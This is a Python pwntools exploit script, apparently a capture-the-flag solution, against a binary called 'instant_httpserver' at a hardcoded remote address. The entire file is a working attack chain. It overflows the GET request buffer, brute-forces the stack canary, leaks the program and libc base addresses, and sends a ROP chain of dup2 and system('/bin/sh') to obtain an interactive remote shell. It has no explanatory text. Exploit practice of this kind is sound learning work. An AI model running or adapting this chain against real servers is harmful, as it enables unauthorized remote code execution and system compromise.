#!/usr/bin/env python
from pwn import *

context.log_level = "DEBUG"

host = "114.177.250.4"
port = 4445

prefix  = "GET"
prefix += "A" * 517

e = ELF("./instant_httpserver")
l = ELF("./libc.so.6")

def leak_canary():
    canary = ""
    guess = 0

    while (len(canary) < 8):
        c = connect(host, port)
        payload  = prefix
        payload += canary
        payload += p8(guess)
        c.send(payload)
        resp = c.recvall()
        
        if "<br /><br /><hr><I>instant_httpserver -- localhost</I>" in resp:
            # bingo!
            c.close()
            canary += p8(guess)
            guess = 0
            continue
        else:
            c.close()
            guess += 1
            continue

    print("canary: 0x%s" % "".join(x.encode("hex") for x in canary))
    return u64(canary, endian="big")

def leak_text_base(canary):
    text_base = "\xe5"
    guess = 0

    while (len(text_base) < 6):
        payload  = prefix
        payload += p64(canary, endian="big")
        payload += p64(0xdeadbeefcafebabe) 
        payload += text_base
        payload += p8(guess)

        c = connect(host, port)
        c.send(payload)
        resp = c.recvall()

        if resp.count("Server: instant_httpserver") > 1:
            # bingo!
            c.close()
            text_base += p8(guess)
            guess = 0
            continue
        else:
            c.close()
            guess += 1
            continue

    text_base  = u64(text_base + "\x00\x00") - 0xde5
    print("text_base: %s" % hex(text_base))
    return text_base 

def leak_libc_base(canary, text_base):
    payload  = prefix 
    payload += p64(canary, endian="big")
    payload += p64(0xdeadbeefcafebabe) 

    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(write_got)
    payload += p64(0xdeadbeefcafebabe)
    payload += p64(write_plt)

    c = connect(host, port)
    c.send(payload)
    c.recvuntil("520")

    resp = c.recvall()

    write_libc = u64(resp[:6] + "\x00\x00")
    libc_base = write_libc - l.symbols["write"]
    print("libc: %s" % hex(libc_base))
    return libc_base

def get_shell(canary, text_base, libc_base):
    payload  = prefix
    payload += p64(canary, endian="big")
    payload += p64(0xdeadbeefcafebabe) 

    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(1)
    payload += p64(0xdeadbeefcafebabe)
    payload += p64(dup2_libc)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(0)
    payload += p64(0xdeadbeefcafebabe)
    payload += p64(dup2_libc)
    payload += p64(ret)
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_libc)
    payload += p64(system_libc)

    c = connect(host, port)
    c.send(payload)
    
    c.interactive()
    c.close()

# 1.
canary = leak_canary()

# 2.
text_base = leak_text_base(canary)

pop_rsi_pop_r15_ret = text_base + 0xe91
pop_rdi_ret         = text_base + 0xe93
ret                 = text_base + 0xe94

write_got = text_base + e.got["write"]
write_plt = text_base + e.plt["write"]

# 3.
libc_base = leak_libc_base(canary, text_base)

binsh_libc  = libc_base + list(l.search("/bin/sh"))[0]
system_libc = libc_base + l.symbols["system"]
dup2_libc   = libc_base + l.symbols["dup2"]

# 4.
get_shell(canary, text_base, libc_base)
